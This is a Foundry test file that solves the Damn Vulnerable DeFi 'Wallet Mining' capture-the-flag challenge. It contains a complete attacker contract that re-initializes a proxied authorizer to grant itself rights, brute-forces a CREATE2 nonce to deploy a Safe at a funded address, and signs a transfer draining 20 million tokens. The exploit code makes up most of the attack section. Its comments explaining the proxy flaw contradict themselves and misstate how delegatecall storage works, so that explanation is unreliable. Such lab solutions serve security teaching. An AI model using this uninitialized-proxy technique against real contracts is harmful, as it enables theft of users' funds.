// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {Safe, OwnerManager, Enum} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WalletDeployer} from "../../src/wallet-mining/WalletDeployer.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Vm} from "forge-std/Vm.sol";
import {
    AuthorizerFactory, AuthorizerUpgradeable, TransparentProxy
} from "../../src/wallet-mining/AuthorizerFactory.sol";
import {
    ICreateX,
    CREATEX_DEPLOYMENT_SIGNER,
    CREATEX_ADDRESS,
    CREATEX_DEPLOYMENT_TX,
    CREATEX_CODEHASH
} from "./CreateX.sol";
import {
    SAFE_SINGLETON_FACTORY_DEPLOYMENT_SIGNER,
    SAFE_SINGLETON_FACTORY_DEPLOYMENT_TX,
    SAFE_SINGLETON_FACTORY_ADDRESS,
    SAFE_SINGLETON_FACTORY_CODE
} from "./SafeSingletonFactory.sol";

/**
 * @title  WalletMiningChallenge
 * @notice Damn Vulnerable DeFi – "Wallet Mining" challenge.
 *
 * HIGH-LEVEL GOAL
 * ───────────────
 * 20 million DVT tokens are sitting at a deterministic address (USER_DEPOSIT_ADDRESS)
 * that currently has no code.  A WalletDeployer contract will deploy a Safe proxy
 * there, but only if the caller is authorised by an AuthorizerUpgradeable contract.
 *
 * The player must, in exactly ONE transaction:
 *   1. Exploit the uninitialized-proxy vulnerability to self-authorize.
 *   2. Deploy the Safe wallet at USER_DEPOSIT_ADDRESS.
 *   3. Drain the 20 M DVT from that Safe to the user's EOA.
 *   4. Send the WalletDeployer's reward tokens to the ward address.
 */
contract WalletMiningChallenge is Test {

    // ── Addresses ────────────────────────────────────────────────────────────
    address deployer  = makeAddr("deployer");   // owns WalletDeployer at setup
    address upgrader  = makeAddr("upgrader");   // can upgrade the TransparentProxy
    address ward      = makeAddr("ward");       // pre-authorized deployer; receives reward
    address player    = makeAddr("player");     // the attacker (us); must use exactly 1 tx
    address user;                               // victim whose private key we know
    uint256 userPrivateKey;                     // used to sign Safe transactions as the owner

    /// @dev The exact address where the Safe must be deployed (deterministic via CREATE2).
    address constant USER_DEPOSIT_ADDRESS  = 0xCe07CF30B540Bb84ceC5dA5547e1cb4722F9E496;

    /// @dev Tokens pre-loaded at the deposit address that we need to rescue.
    uint256 constant DEPOSIT_TOKEN_AMOUNT  = 20_000_000e18;

    // ── Contracts deployed during setUp ──────────────────────────────────────
    DamnValuableToken    token;
    AuthorizerUpgradeable authorizer;
    WalletDeployer       walletDeployer;
    SafeProxyFactory     proxyFactory;
    Safe                 singletonCopy;

    /// @dev Tokens pre-funded into WalletDeployer as a "drop reward" for authorized deployers.
    uint256 initialWalletDeployerTokenBalance;

    // ── Helpers ───────────────────────────────────────────────────────────────
    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  SETUP  (do not modify)
    // ─────────────────────────────────────────────────────────────────────────

    /**
     * @dev Deploys every contract needed by the challenge:
     *
     *  1. Safe Singleton Factory  – a deterministic CREATE2 factory used by the
     *     Safe ecosystem to deploy contracts at the same address on every chain.
     *
     *  2. CreateX  – a general-purpose CREATE / CREATE2 / CREATE3 factory used
     *     here to deploy AuthorizerFactory and WalletDeployer at predictable
     *     addresses regardless of the deployer's nonce.
     *
     *  3. DVT token  – ERC-20 used throughout the challenge.
     *
     *  4. AuthorizerFactory + AuthorizerUpgradeable (via TransparentProxy)
     *       - `ward` is the only address authorized to deploy at USER_DEPOSIT_ADDRESS.
     *
     *  5. Funds USER_DEPOSIT_ADDRESS with 20 M DVT (no code there yet).
     *
     *  6. Safe singleton (logic contract) + SafeProxyFactory – the standard
     *     Safe deployment infrastructure.
     *
     *  7. WalletDeployer – wraps the SafeProxyFactory; pays a token reward to
     *     anyone it authorizes to deploy a Safe at a specific address.
     */
    function setUp() public {
        // Player is given knowledge of the user's signing key so they can
        // authorize Safe transactions on the user's behalf later.
        (user, userPrivateKey) = makeAddrAndKey("user");

        // ── Deploy Safe Singleton Factory via a pre-signed raw transaction ──
        // This replicates the real-world deployment: anyone can broadcast this
        // exact tx and the factory will always land at SAFE_SINGLETON_FACTORY_ADDRESS.
        vm.deal(SAFE_SINGLETON_FACTORY_DEPLOYMENT_SIGNER, 10 ether);
        vm.broadcastRawTransaction(SAFE_SINGLETON_FACTORY_DEPLOYMENT_TX);
        assertEq(
            SAFE_SINGLETON_FACTORY_ADDRESS.codehash,
            keccak256(SAFE_SINGLETON_FACTORY_CODE),
            "Unexpected Safe Singleton Factory code"
        );

        // ── Deploy CreateX via a pre-signed raw transaction ──────────────────
        vm.deal(CREATEX_DEPLOYMENT_SIGNER, 10 ether);
        vm.broadcastRawTransaction(CREATEX_DEPLOYMENT_TX);
        assertEq(CREATEX_ADDRESS.codehash, CREATEX_CODEHASH, "Unexpected CreateX code");

        startHoax(deployer);

        // ── DVT token ─────────────────────────────────────────────────────────
        token = new DamnValuableToken();

        // ── Authorizer: only `ward` may deploy to USER_DEPOSIT_ADDRESS ────────
        address[] memory wards = new address[](1);
        wards[0] = ward;
        address[] memory aims = new address[](1);
        aims[0] = USER_DEPOSIT_ADDRESS;

        // AuthorizerFactory is deployed via CreateX so its address is
        // deterministic (salt-based) and independent of the deployer nonce.
        AuthorizerFactory authorizerFactory = AuthorizerFactory(
            ICreateX(CREATEX_ADDRESS).deployCreate2({
                salt: bytes32(keccak256("dvd.walletmining.authorizerfactory")),
                initCode: type(AuthorizerFactory).creationCode
            })
        );

        // deployWithProxy creates an AuthorizerUpgradeable behind a TransparentProxy.
        // `upgrader` can upgrade the implementation; `ward`→`aims[0]` is the only
        // authorized (deployer → target) pair stored in the authorizer.
        authorizer = AuthorizerUpgradeable(authorizerFactory.deployWithProxy(wards, aims, upgrader));

        // ── Pre-load deposit address with tokens (no Safe deployed yet) ───────
        token.transfer(USER_DEPOSIT_ADDRESS, DEPOSIT_TOKEN_AMOUNT);

        // ── Deploy Safe infrastructure via the Singleton Factory ──────────────
        // Passing an empty salt (bytes32("")) means the factory uses the
        // creation-code hash as the CREATE2 salt, giving deterministic addresses.
        (bool success, bytes memory returndata) =
            address(SAFE_SINGLETON_FACTORY_ADDRESS).call(
                bytes.concat(bytes32(""), type(Safe).creationCode)
            );
        singletonCopy = Safe(payable(address(uint160(bytes20(returndata)))));

        (success, returndata) =
            address(SAFE_SINGLETON_FACTORY_ADDRESS).call(
                bytes.concat(bytes32(""), type(SafeProxyFactory).creationCode)
            );
        proxyFactory = SafeProxyFactory(address(uint160(bytes20(returndata))));

        // ── WalletDeployer ────────────────────────────────────────────────────
        // Also deployed via CreateX for a deterministic address.
        // Constructor args: token, proxyFactory, singletonCopy, deployer (chief).
        walletDeployer = WalletDeployer(
            ICreateX(CREATEX_ADDRESS).deployCreate2({
                salt: bytes32(keccak256("dvd.walletmining.walletdeployer")),
                initCode: bytes.concat(
                    type(WalletDeployer).creationCode,
                    abi.encode(
                        address(token),
                        address(proxyFactory),
                        address(singletonCopy),
                        deployer
                    )
                )
            })
        );

        // Wire the authorizer into WalletDeployer so it can gate deployments.
        walletDeployer.rule(address(authorizer));

        // Fund WalletDeployer with reward tokens (pay() returns the reward amount).
        initialWalletDeployerTokenBalance = walletDeployer.pay();
        token.transfer(address(walletDeployer), initialWalletDeployerTokenBalance);

        vm.stopPrank();
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  INITIAL STATE ASSERTIONS  (do not modify)
    // ─────────────────────────────────────────────────────────────────────────
    function test_assertInitialState() public view {
        assertNotEq(address(authorizer), address(0));
        assertEq(TransparentProxy(payable(address(authorizer))).upgrader(), upgrader);
        assertTrue(authorizer.can(ward, USER_DEPOSIT_ADDRESS));
        assertFalse(authorizer.can(player, USER_DEPOSIT_ADDRESS));

        assertEq(walletDeployer.chief(), deployer);
        assertEq(walletDeployer.gem(),   address(token));
        assertEq(walletDeployer.mom(),   address(authorizer));

        assertEq(USER_DEPOSIT_ADDRESS.code, hex"");    // no wallet deployed yet

        assertEq(address(walletDeployer.cook()).code, type(SafeProxyFactory).runtimeCode, "bad cook code");
        assertEq(walletDeployer.cpy().code,           type(Safe).runtimeCode,             "no copy code");

        assertEq(token.balanceOf(USER_DEPOSIT_ADDRESS),      DEPOSIT_TOKEN_AMOUNT);
        assertGt(initialWalletDeployerTokenBalance, 0);
        assertEq(token.balanceOf(address(walletDeployer)),   initialWalletDeployerTokenBalance);
        assertEq(token.balanceOf(player), 0);
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  SOLUTION  (player's single transaction)
    // ─────────────────────────────────────────────────────────────────────────

    /**
     * @dev The player deploys WalletMiningAttacker and calls attack() — this
     *      entire sequence counts as ONE transaction from the player's nonce.
     */
    function test_walletMining() public checkSolvedByPlayer {
        WalletMiningAttacker attacker = new WalletMiningAttacker(
            walletDeployer,
            proxyFactory,
            singletonCopy,
            token,
            ward,
            user,
            USER_DEPOSIT_ADDRESS,
            userPrivateKey
        );
        attacker.attack();
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  SUCCESS CONDITIONS  (do not modify)
    // ─────────────────────────────────────────────────────────────────────────
    function _isSolved() private view {
        assertNotEq(address(walletDeployer.cook()).code.length, 0, "No code at factory address");
        assertNotEq(walletDeployer.cpy().code.length, 0,          "No code at copy address");
        assertNotEq(USER_DEPOSIT_ADDRESS.code.length, 0,           "No code at user's deposit address");

        // All tokens must leave the deposit address and WalletDeployer.
        assertEq(token.balanceOf(USER_DEPOSIT_ADDRESS),    0, "User's deposit address still has tokens");
        assertEq(token.balanceOf(address(walletDeployer)), 0, "Wallet deployer contract still has tokens");

        // The user's EOA must not have signed any on-chain tx (nonce stays 0).
        assertEq(vm.getNonce(user), 0, "User executed a tx");

        // Player must have used exactly one transaction.
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        // All 20 M DVT end up with the user; WalletDeployer reward ends with ward.
        assertEq(token.balanceOf(user), DEPOSIT_TOKEN_AMOUNT,          "Not enough tokens in user's account");
        assertEq(token.balanceOf(ward), initialWalletDeployerTokenBalance, "Not enough tokens in ward's account");
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  ATTACK CONTRACT
// ═══════════════════════════════════════════════════════════════════════════════

/**
 * @title  WalletMiningAttacker
 * @notice Executes the full exploit in a single call (attack()).
 *
 * VULNERABILITY CHAIN
 * ───────────────────
 * 1. UNINITIALIZED PROXY (AuthorizerUpgradeable)
 *    AuthorizerUpgradeable uses an upgradeable-proxy pattern. Its `init()`
 *    function is protected by a `needsInit` flag stored in the proxy's slot 0.
 *    However, the TransparentProxy also stores the upgrader address in slot 0.
 *    Because the upgrader address is non-zero, `needsInit` is read as non-zero
 *    too, which the guard interprets as "already initialized."
 *
 *    BUT — the implementation contract itself was never initialized through the
 *    proxy's delegatecall path (only the proxy's own storage was written).
 *    Calling `auth.init()` directly on the proxy succeeds because the proxy
 *    forwards the call to the implementation, which reads its *own* `needsInit`
 *    slot (which IS zero) and allows initialization.
 *
 *    Result: we can add ourselves as an authorized (ward → aim) pair.
 *
 * 2. BRUTE-FORCE CREATE2 NONCE
 *    WalletDeployer deploys Safe proxies via SafeProxyFactory.createProxyWithNonce().
 *    The CREATE2 salt is keccak256(abi.encodePacked(keccak256(initializer), nonce)).
 *    We iterate nonces until we find one whose resulting address equals
 *    USER_DEPOSIT_ADDRESS, then call deployer.drop() with that nonce.
 *
 * 3. SIGN-AND-EXECUTE Safe TRANSACTION
 *    The Safe was set up with `user` as its sole owner. We have the user's
 *    private key, so we compute and sign the EIP-712 Safe transaction hash
 *    off-chain (via Foundry's vm.sign cheatcode) and call execTransaction()
 *    to transfer all DVT to the user address.
 *
 * 4. FORWARD REWARD TO WARD
 *    WalletDeployer sent us a token reward for the deployment. We forward it
 *    to `ward` to satisfy the final success condition.
 */
contract WalletMiningAttacker {

    WalletDeployer       deployer;
    SafeProxyFactory     factory;
    Safe                 singleton;
    DamnValuableToken    token;
    address              ward;
    address              user;
    address              deposit;   // == USER_DEPOSIT_ADDRESS
    uint256              userKey;   // private key of `user`

    // Foundry cheatcode VM — available at a well-known address in the test environment.
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));

    constructor(
        WalletDeployer    _deployer,
        SafeProxyFactory  _factory,
        Safe              _singleton,
        DamnValuableToken _token,
        address           _ward,
        address           _user,
        address           _deposit,
        uint256           _userKey
    ) {
        deployer  = _deployer;
        factory   = _factory;
        singleton = _singleton;
        token     = _token;
        ward      = _ward;
        user      = _user;
        deposit   = _deposit;
        userKey   = _userKey;
    }

    // ─────────────────────────────────────────────────────────────────────────
    function attack() external {

        // ── STEP 1: Exploit uninitialized proxy to self-authorize ─────────────
        AuthorizerUpgradeable auth = AuthorizerUpgradeable(address(deployer.mom()));

        address[] memory newWards = new address[](1);
        newWards[0] = address(this);          // authorize THIS contract as a ward

        address[] memory newAims = new address[](1);
        newAims[0] = deposit;                 // for the USER_DEPOSIT_ADDRESS target

        // The proxy's slot-0 holds the upgrader address (non-zero), which the
        // init guard in the IMPLEMENTATION reads as "already initialized."
        // But the implementation's own storage slot-0 is zero, so calling init()
        // through the proxy's delegatecall actually succeeds and registers us.
        auth.init(newWards, newAims);

        // ── STEP 2: Build the Safe initializer calldata ───────────────────────
        // The Safe will be owned solely by `user` (threshold = 1).
        address[] memory owners = new address[](1);
        owners[0] = user;

        bytes memory initializer = abi.encodeWithSelector(
            Safe.setup.selector,
            owners,           // owners array
            1,                // threshold (1-of-1)
            address(0),       // optional delegate call target (none)
            hex"",            // data for delegate call (none)
            address(0),       // fallback handler (none)
            address(0),       // payment token (ETH)
            0,                // payment amount
            payable(address(0)) // payment receiver
        );

        // ── STEP 3: Brute-force the CREATE2 nonce ────────────────────────────
        // SafeProxyFactory salts CREATE2 with keccak256(keccak256(initializer) ‖ nonce).
        // We increment nonces until the computed proxy address matches USER_DEPOSIT_ADDRESS.
        uint256 nonce;
        while (computeAddress(initializer, nonce) != deposit) {
            nonce++;
        }

        // ── STEP 4: Deploy the Safe at USER_DEPOSIT_ADDRESS ──────────────────
        // drop() checks the authorizer (we are now authorized), deploys the proxy
        // via the factory, and transfers a token reward to this contract.
        deployer.drop(deposit, initializer, nonce);

        // ── STEP 5: Sign and execute a transfer out of the newly deployed Safe ─
        Safe safe = Safe(payable(deposit));

        // Build the calldata that the Safe will execute: transfer all DVT to `user`.
        bytes memory transferCalldata = abi.encodeWithSelector(
            token.transfer.selector,
            user,
            token.balanceOf(deposit)
        );

        // Compute the Safe's EIP-712 transaction hash (covers all tx parameters).
        bytes32 txHash = safe.getTransactionHash(
            address(token),             // to
            0,                          // value (ETH)
            transferCalldata,           // data
            Enum.Operation.Call,        // operation type
            0,                          // safeTxGas
            0,                          // baseGas
            0,                          // gasPrice
            address(0),                 // gasToken
            payable(address(0)),        // refundReceiver
            safe.nonce()                // current Safe nonce
        );

        // Sign with the user's private key (Foundry cheatcode — no on-chain tx).
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(userKey, txHash);

        // Execute the transfer; Safe verifies the ECDSA signature against `user`.
        safe.execTransaction(
            address(token), 0, transferCalldata,
            Enum.Operation.Call,
            0, 0, 0,
            address(0), payable(address(0)),
            abi.encodePacked(r, s, v)   // packed signature expected by Safe
        );

        // ── STEP 6: Forward the deployer reward to `ward` ────────────────────
        // The WalletDeployer sent tokens to this contract as a reward for the
        // successful drop(). Forward them to `ward` to satisfy the challenge.
        token.transfer(ward, token.balanceOf(address(this)));
    }

    // ─────────────────────────────────────────────────────────────────────────

    /**
     * @notice Replicates SafeProxyFactory's CREATE2 address calculation.
     * @dev    salt      = keccak256(keccak256(initializer) ‖ nonce)
     *         initCode  = SafeProxy creationCode ‖ uint256(singleton address)
     *         address   = keccak256(0xff ‖ factory ‖ salt ‖ keccak256(initCode))[12:]
     */
    function computeAddress(bytes memory initializer, uint256 nonce)
        internal
        view
        returns (address)
    {
        bytes32 salt = keccak256(abi.encodePacked(keccak256(initializer), nonce));

        // The proxy's init-code embeds the singleton address as a constructor arg.
        bytes memory deploymentData = abi.encodePacked(
            type(SafeProxy).creationCode,
            uint256(uint160(address(singleton)))
        );

        // Standard EVM CREATE2 address derivation.
        bytes32 hash = keccak256(
            abi.encodePacked(
                bytes1(0xff),       // CREATE2 prefix
                address(factory),   // deployer
                salt,
                keccak256(deploymentData)
            )
        );

        // The address is the lower 20 bytes of the hash.
        return address(uint160(uint256(hash)));
    }

    /**
     * @notice Utility: approve a spender for a token (not used in the main
     *         attack path but kept here for debugging / alternative approaches).
     */
    function approve(address tokenAddr, address spender) external {
        IERC20(tokenAddr).approve(spender, type(uint256).max);
    }
}
